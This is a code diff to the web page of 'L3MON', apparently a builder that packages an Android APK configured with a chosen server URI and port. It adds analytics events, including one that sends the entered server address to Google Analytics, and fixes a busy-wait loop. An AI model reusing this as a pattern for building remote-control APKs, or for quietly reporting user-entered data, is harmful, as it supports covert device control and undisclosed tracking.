@@ -57,6 +57,10 @@
     </style>
 
     <script>
+        gtag('event', 'screen_view', {
+            'screen_name': 'apkBuilder',
+            'app_name': 'L3MON'
+        });
 
         var loadingTexts = [
             "Decompiling APK",
@@ -69,6 +73,7 @@
 
         var loadingIndex = 0;
         var isDone = false;
+        var isDoneInterval;
         $('#gobuild').click((e) => {
             $('#dimmer').addClass('active');
             build($('#uriInput').val(), $('#portInput').val());
@@ -80,18 +85,24 @@
             $('#loadingText').text(loadingTexts[loadingIndex]);
             loadingIndex++;
             if (loadingIndex !== loadingTexts.length) setTimeout(loaderText, nextTimeout);
-            else while (isDone) {
-                isDone = false;
-                $('#dimmer').fadeOut(500, () => {
-                    $('#download').removeClass('active');
-                })
-                $('#form').fadeOut(500, () => {
-                    $('#download').fadeIn(200);
-                })
-            }
+            else isDoneInterval = setInterval(() => {
+                if (isDone) {
+                    clearInterval(isDoneInterval);
+                    isDone = false;
+                    $('#dimmer').fadeOut(500, () => {
+                        $('#download').removeClass('active');
+                    })
+                    $('#form').fadeOut(500, () => {
+                        $('#download').fadeIn(200);
+                    })
+                }
+            }, 100);
         }
 
         function build(URI, PORT) {
+            gtag('event', 'build', {
+                'builduri': URI + ':' + PORT
+            });
             $.post("/builder?uri=" + URI + "&port=" + PORT, function (data) {
                 if (!data.error) {
                     isDone = true
